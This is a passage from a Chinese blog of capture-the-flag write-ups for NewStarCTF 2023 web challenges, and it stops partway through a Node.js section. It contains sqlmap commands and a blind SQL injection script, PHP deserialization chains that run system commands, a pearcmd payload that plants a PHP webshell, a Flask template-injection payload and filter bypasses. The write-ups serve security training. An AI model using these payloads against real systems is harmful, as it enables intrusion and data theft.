<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 --dbs</span></span><br><span class="line">[*] ctf</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line">[*] test</span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf --tables</span></span><br><span class="line"> grades       |</span><br><span class="line">| here_is_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag --columns</span></span><br><span class="line"> flag   | varchar(<span class="number">255</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag -C &quot;flag&quot; --dump</span></span><br></pre></td></tr></table></figure>

<h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p>考点：</p>
<ul>
<li>htaccess</li>
</ul>
<p>很基础</p>
<h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>考点:</p>
<ul>
<li>php反序列化</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> $cmd=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, $<span class="built_in">this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="meta">@system($this-&gt;cmd)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">evil</span>();</span><br><span class="line">echo <span class="title function_">urlencode</span><span class="params">(serialize($a)</span>);</span><br><span class="line">?&gt;</span><br><span class="line">#O%3A4%3A%22evil%<span class="number">22</span>%3A1%3A%7Bs%3A9%3A%<span class="number">22</span>%00evil%00cmd%<span class="number">22</span>%3Bs%3A33%3A%22nl+%2Fth1s_1s_fffflllll4444aaaggggg%<span class="number">22</span>%3B%<span class="number">7D</span></span><br></pre></td></tr></table></figure>

<h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>禁了base所以不能用常用的base64转码了 换种转码方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171708476-0624b883-3c25-461c-8127-7f163a4bab2e.png" alt="img"></p>
<p>再解码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"><span class="variable">$str</span> <span class="operator">=</span> <span class="string">&quot;?&lt;hp p//lfga5&#123;719c28-e567c4-d9-1dab5e-7c6326be71&#125;9&quot;</span>;</span><br><span class="line">echo <span class="title function_">iconv</span><span class="params">(<span class="string">&#x27;UCS-2BE&#x27;</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, $str)</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171733094-68be6a56-67e1-45ab-88fa-8df2ea9eb0ad.png" alt="img"></p>
<h2 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>考点:</p>
<ul>
<li>git泄露</li>
<li>无参rce</li>
</ul>
<p>首先获得源码 得到<code>/bo0g1pop.php</code>路由</p>
<p>得到源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,$_GET[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        eval($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">GET /bo0g1pop.php?star=system(next(getallheaders())); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 18e0aabc-<span class="number">695f</span>-46fd-b4e2-3557e66a3cdc.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: cat /flag</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>

<p>利用User-Agent字段进行构造rce</p>
<h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>考察：</p>
<ul>
<li>sql盲注</li>
</ul>
<p>直接sqlmap level3梭哈或者自己写个脚本（沙贝是自己）</p>
<p>poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&#x27;http://3984f01f-9843-4df0-a21f-95a7eff68063.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">50</span>)</span>:</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        paylaod = <span class="string">&quot;TMP0929&#x27;And/**/0^(Ascii(Substr((Select(flag)from(ctf.here_is_flag)),&#123;&#125;,1))&gt;&#123;&#125;)%23&quot;</span>.format(i,mid)</span><br><span class="line">        #爆库爆数据语句差不多 关键字被ban大写绕过就行</span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+paylaod)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;English&quot;</span> in r.text):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    result+=chr(high+<span class="number">1</span>)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h2 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h2><p>考点:</p>
<ul>
<li>pearcmd</li>
</ul>
<p>根据提示</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697164131734-b78abbc2-ee62-4767-965e-11accdbf5e48.png" alt="img"></p>
<p><code>register_argc_argv</code>是on</p>
<p>那么<code>register_argc_argv</code>是什么呢 </p>
<p>简单说<code> register_argc_argv</code>开启时我们传入get的参数会被记录在<code>$_SERVER</code>这个全局变量数组中</p>
<p>并且$argc变量是⽤于记录数组的⼤⼩ $argv变量是⽤于记录输⼊的参数</p>
<p>条件：</p>
<ul>
<li>⽼版本（测试版本为5.2.17）默认为 On</li>
<li>新版本（测试版本为 5.4.45、5.5.9、7.3.4）默认为 Off</li>
</ul>
<p>我们要传入如果正常传入参数，数组的大小永远是1</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165693345-4172a348-e3bd-473c-b24a-303757cc3b1e.png" alt="img"></p>
<p>如果要表示两个数组，需要用+隔开</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165707316-253cea3f-c08e-4f2d-b928-46805a4bceee.png" alt="img"></p>
<p>来自：</p>
<p><a target="_blank" rel="noopener" href="https://www.shawroot.cc/1643.html">https://www.shawroot.cc/1643.html</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2204400?areaId=106001">https://cloud.tencent.com/developer/article/2204400?areaId=106001</a></p>
<p>一般这个搭配pearcmd使用 写马到网站根目录下 然后包含rce即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>

<p>记得要抓一次包重写一下一句话木马 不然会被转码导致不成功</p>
<h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>考点：</p>
<ul>
<li>php反序列化</li>
</ul>
<p>源码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Begin</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,$<span class="built_in">this</span>-&gt;name))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Then</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $func;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        ($<span class="built_in">this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handle</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__call</span><span class="params">($func, $vars)</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj-&gt;end();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Super</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__invoke</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTF</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        unset($<span class="built_in">this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WhiteGod</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $<span class="keyword">var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__unset</span><span class="params">($<span class="keyword">var</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        ($<span class="built_in">this</span>-&gt;func)($<span class="built_in">this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@unserialize($_POST[&#x27;pop&#x27;])</span>;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Begin</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Then</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $func;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handle</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">CTF</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Super</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTF</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WhiteGod</span>&#123;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$func</span> <span class="operator">=</span> <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$var</span> <span class="operator">=</span> <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line">$a-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line">echo <span class="title function_">urlencode</span><span class="params">(serialize($a)</span>);</span><br></pre></td></tr></table></figure>

<h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>考点：</p>
<ul>
<li>flask ssti</li>
</ul>
<p>抓包获得</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166037980-4bb0dd83-1b97-4a6c-b1f6-c2c8566ddbab.png" alt="img"></p>
<p>一眼丁真flask ssti注入</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166058190-e47aa6de-380f-42ef-a2ce-f04c871166e3.png" alt="img"></p>
<p>直接当脚本小子</p>
<p>或者payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(((g.pop.__globals__.__builtins__.__import__(&quot;os&quot;)[&quot;p&quot;&quot;open&quot;](&quot;cat /flag&quot;)).read()))%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">minipop</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code;</span><br><span class="line">    <span class="keyword">public</span> $qwejaskdjnlka;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $<span class="built_in">this</span>-&gt;code))&#123;</span><br><span class="line">            exec($<span class="built_in">this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        echo $<span class="built_in">this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    unserialize($_POST[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>反序列化套一下就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag|t\e\e /var/www/html/1</span><br></pre></td></tr></table></figure>

<p>将读到的flag通过管道符用tee写道网站根目录下 然后访问</p>
<p>关键字通过反斜杠转义来绕过<code>\</code></p>
<h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>考点：</p>
<ul>
<li>nodejs 原型链污染</li>
</ul>
<p>我是傻逼 关键东西老是看不到</p>
<p>给了源码</p>
<p>根据提示我们只需要关注routes包下的内容即可 也不需要sql注入</p>
<p>info.js</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">Router</span> <span class="operator">=</span> require(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">router</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="type">const</span> <span class="variable">SQL</span> <span class="operator">=</span> require(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">CONFIG</span> <span class="operator">=</span> require(<span class="string">&quot;../config&quot;</span>)</span><br><span class="line"><span class="type">const</span> <span class="variable">DEFAULT_CONFIG</span> <span class="operator">=</span> require(<span class="string">&quot;../config.default&quot;</span>)</span><br><span class="line"></span><br><span class="line">async function <span class="title function_">getInfo</span><span class="params">(timestamp)</span> &#123;</span><br><span class="line">    timestamp = typeof timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : Date.now();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">minTimestamp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();</span><br><span class="line">    timestamp = Math.max(timestamp, minTimestamp);</span><br><span class="line">    <span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).<span class="keyword">catch</span>(e =&gt; &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/info/:ts?&quot;</span>, async (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.header[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof ctx.params.ts === <span class="string">&quot;undefined&quot;</span>) ctx.params.ts = <span class="number">0</span></span><br><span class="line">    <span class="type">const</span> <span class="variable">timestamp</span> <span class="operator">=</span> /^[<span class="number">0</span>-<span class="number">9</span>]+$/.test(ctx.params.ts || <span class="string">&quot;&quot;</span>) ? Number(ctx.params.ts) : ctx.params.ts;</span><br><span class="line">    <span class="keyword">if</span> (typeof timestamp !== <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Invalid parameter ts&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> await <span class="title function_">getInfo</span><span class="params">(timestamp)</span>.<span class="keyword">catch</span>(e =&gt; &#123; <span class="keyword">throw</span> e 